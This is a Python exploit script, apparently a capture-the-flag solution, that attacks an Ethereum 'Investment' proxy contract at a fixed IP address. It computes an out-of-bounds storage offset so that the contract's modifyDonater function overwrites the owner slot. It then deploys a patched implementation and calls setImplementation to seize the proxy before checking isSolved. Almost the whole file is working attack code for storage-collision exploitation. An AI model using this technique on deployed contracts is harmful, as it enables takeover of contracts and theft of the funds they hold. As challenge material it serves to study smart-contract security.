import binascii
import json
import requests
import secrets
import time

from coincurve import PublicKey

# pysha3
from sha3 import keccak_256
from web3 import Web3


CONTRACT_ADDRESS = "0x536Ca975034e0b3Fa25c791753A96CeB8e4d2fd0"
FAUCET = "http://13.125.194.44:8080/api/claim"


def h2i(bytes_):
    assert str(bytes_[:2]) == "0x"
    return int(bytes_[2:], 16)


def b2i(bytes_):
    assert len(bytes_) == 0x20
    return int.from_bytes(bytes_, byteorder="big")


def i2b(val):
    return bytes(bytearray.fromhex(hex(val)[2:])).rjust(0x20, b"\x00")


def build_param(provider):
    return {
        "gas": 5000000,
        "gasPrice": Web3.toWei(100, "gwei"),
        "nonce": provider.eth.get_transaction_count(user_addr),
    }


def wait_for_tx(provider, tx_hash):
    # eth.wait_for_transaction_receipt is available,
    # but manually implemented for in-progress message
    while True:
        try:
            receipt = provider.eth.get_transaction_receipt(tx_hash)
            print("Receipt:", receipt)
            print("Balance after tx:", provider.eth.get_balance(checked_user_addr))
            return receipt
        except Exception as e:
            if "not found" in str(e):
                print("Waiting for the transaction...")
            else:
                raise e
        time.sleep(3)


def transact_and_wait(provider, transaction, private_key):
    transaction = transaction.buildTransaction(build_param(provider))
    print("Sending:", transaction)
    signed_tx = provider.eth.account.sign_transaction(transaction, private_key)
    tx_hash = provider.eth.send_raw_transaction(signed_tx.rawTransaction)
    return wait_for_tx(provider, tx_hash)


url = "http://13.125.194.44:8545"
provider = Web3(Web3.HTTPProvider(url))


with open("invest.json") as f:
    invest_abi = json.load(f)
    invest = provider.eth.contract(CONTRACT_ADDRESS, abi=invest_abi)

with open("invest.patched.json") as f:
    invest_patched_abi = json.load(f)
    invest_patched = provider.eth.contract(CONTRACT_ADDRESS, abi=invest_patched_abi)

with open("proxy.json") as f:
    proxy_abi = json.load(f)
    proxy = provider.eth.contract(CONTRACT_ADDRESS, abi=proxy_abi)

with open("Investment.patched.hex") as f:
    patched_bin = binascii.unhexlify(f.read())


# Storage location
donators_slot = keccak_256(b"\x00" * 31 + b"\x02").digest()
donators_slot_int = b2i(donators_slot)
owner_offset = (1 << 256) + 1 - donators_slot_int

print("donators slot:", "0x" + donators_slot.hex())
print("offset:", hex(owner_offset))

# Generate priv/public key
while True:
    # https://www.arthurkoziel.com/generating-ethereum-addresses-in-python/
    private_key = keccak_256(secrets.token_bytes(32)).digest()
    public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)[1:]
    user_addr = keccak_256(public_key).digest()[-20:]

    # Ensure that we can overwrite owner
    if b2i(user_addr + b"\x00" * 12) + donators_slot_int > (1 << 256) + 1:
        break

checked_user_addr = Web3.toChecksumAddress(user_addr)

print("private_key:", private_key.hex())
print("eth addr:", checked_user_addr)


print("[*] Get ether from faucet")
tx_hash = requests.post(FAUCET, data={"address": checked_user_addr}).text
wait_for_tx(provider, tx_hash)


print("[*] Calling init()")
transact_and_wait(provider, invest.functions.init(), private_key)


print("[*] Deploy patched contract")
receipt = transact_and_wait(
    provider,
    provider.eth.contract(abi=invest_patched_abi, bytecode=patched_bin).constructor(
        CONTRACT_ADDRESS
    ),
    private_key,
)
patched_addr = receipt["contractAddress"]


print("[*] Overwrite owner")
transact_and_wait(provider, invest.functions.modifyDonater(owner_offset), private_key)


print("[*] Overwrite implementation")
transact_and_wait(
    provider, proxy.functions.setImplementation(patched_addr), private_key
)


print("[*] Run is_solved")
receipt = transact_and_wait(provider, invest.functions.isSolved(), private_key)
